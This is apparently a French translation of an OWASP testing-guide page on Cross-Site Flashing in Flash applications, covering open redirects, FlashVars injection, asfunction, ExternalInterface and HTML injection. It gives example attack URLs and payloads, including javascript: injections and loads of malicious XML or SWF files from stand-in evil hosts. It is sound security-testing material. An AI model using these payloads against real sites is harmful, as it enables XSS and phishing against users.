# Test du clignotement intersite

|ID          |
|------------|
|WSTG-CLNT-08|

## Sommaire

ActionScript, basé sur ECMAScript, est le langage utilisé par les applications Flash pour répondre à des besoins interactifs. Il existe trois versions du langage ActionScript. ActionScript 1.0 et ActionScript 2.0 sont très similaires, ActionScript 2.0 étant une extension d'ActionScript 1.0. ActionScript 3.0, introduit avec Flash Player 9, est une réécriture du langage pour prendre en charge la conception orientée objet.

ActionScript, comme tous les autres langages, a des modèles d'implémentation qui peuvent entraîner des problèmes de sécurité. En particulier, étant donné que les applications Flash sont souvent intégrées dans les navigateurs, des vulnérabilités telles que le Cross Site Scripting (DOM XSS) basé sur DOM pourraient être présentes dans les applications Flash défectueuses.

Cross-Site Flashing (XSF) est une vulnérabilité qui a un impact similaire à XSS.

XSF se produit lorsque les scénarios suivants sont lancés à partir de différents domaines :

- Un film charge un autre film avec les fonctions `loadMovie*` (ou d'autres hacks) et a accès au même bac à sable, ou à une partie de celui-ci.
- Une page HTML utilise JavaScript pour commander une animation Adobe Flash, par exemple en appelant :
    - `GetVariable` pour accéder aux objets publics et statiques Flash à partir de JavaScript sous forme de chaîne.
    - `SetVariable` pour définir un objet Flash statique ou public sur une nouvelle valeur de chaîne avec JavaScript.
- Communications inattendues entre le navigateur et l'application SWF, pouvant entraîner le vol de données de l'application SWF.

XSF peut être exécuté en forçant un fichier SWF défectueux à charger un fichier Flash externe malveillant. Cette attaque pourrait entraîner XSS ou la modification de l'interface graphique afin de tromper un utilisateur pour qu'il insère des informations d'identification sur un faux formulaire Flash. XSF peut être utilisé en présence de Flash HTML Injection ou de fichiers SWF externes lorsque les méthodes `loadMovie*` sont utilisées.

### Ouvrir les redirecteurs

Les SWF ont la capacité de naviguer dans le navigateur. Si le SWF prend la destination en tant que FlashVar, alors le SWF peut être utilisé comme redirecteur ouvert. Un redirecteur ouvert est toute fonctionnalité de site Web sur un site Web de confiance qu'un attaquant peut utiliser pour rediriger l'utilisateur final vers un site Web malveillant. Ceux-ci sont fréquemment utilisés dans les attaques de phishing. Semblable au cross-site scripting, l'attaque implique qu'un utilisateur clique sur un lien malveillant.

Dans le cas de Flash, l'URL malveillante pourrait ressembler à :

```text
http://trusted.exemple.org/trusted.swf?getURLValue=http://www.evil-spoofing-website.org/phishEndUsers.html
```

Dans l'exemple ci-dessus, un utilisateur final peut voir que l'URL commence par son site Web de confiance préféré et cliquer dessus. Le lien chargerait le fichier SWF de confiance qui prend `getURLValue` et le fournit à un appel de navigation du navigateur ActionScript :

```actionscript
getURL(_root.getURLValue,"_self");
```

Cela dirigerait le navigateur vers l'URL malveillante fournie par l'attaquant. À ce stade, l'hameçonneur a réussi à tirer parti de la confiance que l'utilisateur a en trust.exemple.org pour inciter l'utilisateur à visiter son site Web malveillant. À partir de là, ils pourraient lancer un 0-day, effectuer une usurpation du site Web d'origine ou tout autre type d'attaque. Les fonds souverains peuvent involontairement agir comme un redirecteur ouvert sur le site Web.

Les développeurs doivent éviter de prendre des URL complètes comme FlashVars. S'ils prévoient uniquement de naviguer sur leur propre site Web, ils doivent utiliser des URL relatives ou vérifier que l'URL commence par un domaine et un protocole de confiance.

### Attaques et version Flash Player

Depuis mai 2007, trois nouvelles versions de Flash Player ont été publiées par Adobe. Chaque nouvelle version restreint certaines des attaques décrites précédemment.

| Version lecteur | `asfonction` | InterfaceExterne | GetURL | Injection HTML |
|-----------------|--------------|------------------|--------|----------------|
| v9.0 r47/48     |  Yes         |   Yes            | Yes    |     Yes        |
| v9.0 r115       |  No          |   Yes            | Yes    |     Yes        |
| v9.0 r124       |  No          |   Yes            | Yes    |     Partially  |

## Objectifs des tests

- Décompiler et analyser le code de l'application.
- Évaluer les entrées de puits et les utilisations de méthodes non sûres.

## Comment tester

Depuis la première publication de [Testing Flash Applications](http://www.wisec.it/en/Docs/flash_App_testing_Owasp07.pdf), de nouvelles versions de Flash Player ont été publiées afin d'atténuer certaines des attaques qui seront décrites. Néanmoins, certains problèmes restent encore exploitables car ils résultent de pratiques de programmation non sécurisées.

### Décompilation

Étant donné que les fichiers SWF sont interprétés par une machine virtuelle intégrée au lecteur lui-même, ils peuvent être potentiellement décompilés et analysés. Flare est le décompilateur ActionScript 2.0 le plus connu et le plus gratuit.

Pour décompiler un fichier SWF avec flare, tapez simplement :

`$ flare hello.swf`

Cela se traduit par un nouveau fichier appelé hello.flr.

La décompilation aide les testeurs car elle permet de tester en boîte blanche les applications Flash. Une recherche rapide sur le Web peut vous mener à divers désassembleurs et outils de sécurité flash.

### Variables non définies FlashVars

Les FlashVars sont les variables que le développeur SWF prévoyait de recevoir de la page Web. Les FlashVars sont généralement transmises à partir de la balise Object ou Embed dans le code HTML. Par exemple:

```html
<object width="550" height="400" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"
codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,124,0">
    <param name="movie" value="somefilename.swf">
    <param name="FlashVars" value="var1=val1&var2=val2">
    <embed src="somefilename.swf" width="550" height="400" FlashVars="var1=val1&var2=val2">
</embed>
</object>
```

Les FlashVars peuvent également être initialisées à partir de l'URL :

`http://www.exemple.org/somefilename.swf?var1=val1&var2=val2`

Dans ActionScript 3.0, un développeur doit affecter explicitement les valeurs FlashVar aux variables locales. Typiquement, cela ressemble à :

```actionscript
var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters;
var var1:String = String(paramObj["var1"]);
var var2:String = String(paramObj["var2"]);
```

Dans ActionScript 2.0, toute variable globale non initialisée est supposée être une FlashVar. Les variables globales sont les variables précédées de `_root`, `_global` ou `_level0`. Cela signifie que si un attribut tel que `_root.varname` n'est pas défini tout au long du flux de code, il peut être écrasé par les paramètres d'URL :

`http://victim/file.swf?varname=value`

Que vous regardiez ActionScript 2.0 ou ActionScript 3.0, FlashVars peut être un vecteur d'attaque. Examinons un code ActionScript 2.0 vulnérable :

exemple:

```actionscript
movieClip 328 __Packages.Locale {

#initclip
    if (!_global.Locale) {
    var v1 = function (on_load) {
        var v5 = new XML();
        var v6 = this;
        v5.onLoad = function (success) {
        if (success) {
            trace('Locale loaded xml');
            var v3 = this.xliff.file.body.$trans_unit;
            var v2 = 0;
            while (v2 < v3.length) {
            Locale.strings[v3[v2]._resname] = v3[v2].source.__text;
            ++v2;
            }
            on_load();
        } else {}
        };
        if (_root.language != undefined) {
        Locale.DEFAULT_LANG = _root.language;
        }
        v5.load(Locale.DEFAULT_LANG + '/player_' +
                            Locale.DEFAULT_LANG + '.xml');
    };
```

Le code ci-dessus pourrait être attaqué en demandant :

`http://victim/file.swf?language=http://evil.exemple.org/malicious.xml?`

### Méthodes dangereuses

Lorsqu'un point d'entrée est identifié, les données qu'il représente peuvent être utilisées par des méthodes non sûres. Si les données ne sont pas filtrées ou validées, cela pourrait entraîner certaines vulnérabilités.

Les méthodes non sûres depuis la version r47 sont :

- `loadVariables()`
- `loadMovie()`
- `getURL()`
- `loadMovie()`
- `loadMovieNum()`
- `FScrollPane.loadScrollContent()`
- `LoadVars.load`
- `LoadVars.send`
- `XML.load( 'url' )`
- `LoadVars.load( 'url' )`
- `Sound.loadSound( 'url' , isStreaming );`
- `NetStream.play( 'url' );`
- `flash.external.ExternalInterface.call(_root.callback)`
- `htmlText`

### Exploitation par XSS réfléchi

Le fichier swf doit être hébergé sur l'hôte de la victime, et les techniques de XSS réfléchi doivent être utilisées. Un attaquant force le navigateur à charger un fichier swf pur directement dans la barre d'adresse (par redirection ou ingénierie sociale) ou en le chargeant via une iframe depuis une page malveillante :

```html
<iframe src='http://victim/path/to/file.swf'></iframe>
```

Dans cette situation, le navigateur générera automatiquement une page HTML comme si elle était hébergée par l'hôte victime.

### GetURL (AS2) / NavigateToURL (AS3)

La fonction GetURL dans ActionScript 2.0 et NavigateToURL dans ActionScript 3.0 permettent à l'animation de charger un URI dans la fenêtre du navigateur. Si une variable indéfinie est utilisée comme premier argument pour getURL :

`getURL(_root.URI,'_targetFrame');`

Ou si une FlashVar est utilisée comme paramètre passé à une fonctionnavigationToURL :

```actionscript
var request:URLRequest = new URLRequest(FlashVarSuppliedURL);
navigateToURL(request);
```

Cela signifie alors qu'il est possible d'appeler JavaScript dans le même domaine où le film est hébergé en demandant :

`http://victim/file.swf?URI=javascript:evilcode`

`getURL('javascript:evilcode','_self');`

La même chose est possible lorsque seule une partie de `getURL` est contrôlée via l'injection DOM avec l'injection Flash JavaScript :

```js
getUrl('javascript:function('+_root.arg+')')
```

### Utilisation de `asfunction`

Vous pouvez utiliser le protocole spécial `asfunction` pour que le lien exécute une fonction ActionScript dans un fichier SWF au lieu d'ouvrir une URL. Jusqu'à la sortie de Flash Player 9 r48, `asfunction` pouvait être utilisé sur toutes les méthodes ayant une URL comme argument. Après cette version, `asfunction` a été limité à une utilisation dans un HTML TextField.

Cela signifie qu'un testeur pourrait essayer d'injecter :

```actionscript
asfunction:getURL,javascript:evilcode
```

dans toutes les méthodes dangereuses, telles que :

```actionscript
loadMovie(_root.URL)
```

en demandant :

`http://victim/file.swf?URL=asfunction:getURL,javascript:evilcode`

### Interface externe

`ExternalInterface.call` est une méthode statique introduite par Adobe pour améliorer l'interaction lecteur/navigateur pour ActionScript 2.0 et ActionScript 3.0.

D'un point de vue sécurité, il pourrait être abusé lorsqu'une partie de son argument pourrait être contrôlée :

```actionscript
flash.external.ExternalInterface.call(_root.callback);
```

le modèle d'attaque pour ce type de faille peut ressembler à ce qui suit :

```js
eval(evilcode)
```

puisque le JavaScript interne exécuté par le navigateur ressemblera à :

```js
eval('try { __flash__toXML('+__root.callback+') ; } catch (e) { "<undefined/>"; }')
```

### Injection HTML

Les objets TextField peuvent restituer un code HTML minimal en définissant :

```actionscript
tf.html = true
tf.htmlText = '<tag>text</tag>'
```

Ainsi, si une partie du texte pouvait être contrôlée par le testeur, une balise `<a>` ou une balise d'image pourrait être injectée, entraînant une modification de l'interface graphique ou une attaque XSS sur le navigateur.

Quelques exemples d'attaques avec le tag `<a>` :

- XSS direct : `<a href='javascript:alert(123)'>`
- Appeler une fonction : `<a href='asfunction:function,arg'>`
- Appelez les fonctions publiques SWF : `<a href='asfunction:_root.obj.function, arg'>`
- Appel statique natif en tant que fonction : `<a href='asfunction:System.Security.allowDomain,evilhost'>`

Une balise d'image pourrait également être utilisée :

```html
<img src='http://evil/evil.swf'>
```

Dans cet exemple, `.swf` est nécessaire pour contourner le filtre interne de Flash Player :

```html
<img src='javascript:evilcode//.swf'>
```

Depuis la sortie de Flash Player 9.0.124.0, XSS n'est plus exploitable, mais la modification de l'interface graphique peut toujours être effectuée.

Les outils suivants peuvent être utiles pour travailler avec SWF :

- [OWASP SWFIntruder](https://wiki.owasp.org/index.php/Category:SWFIntruder)
- [Décompilateur - Flare](http://www.nowrap.de/flare.html)
- [Désassembleur – Flasm](http://flasm.sourceforge.net/)
- [Swfmill - Convertir Swf en XML et vice versa](https://www.swfmill.org/)
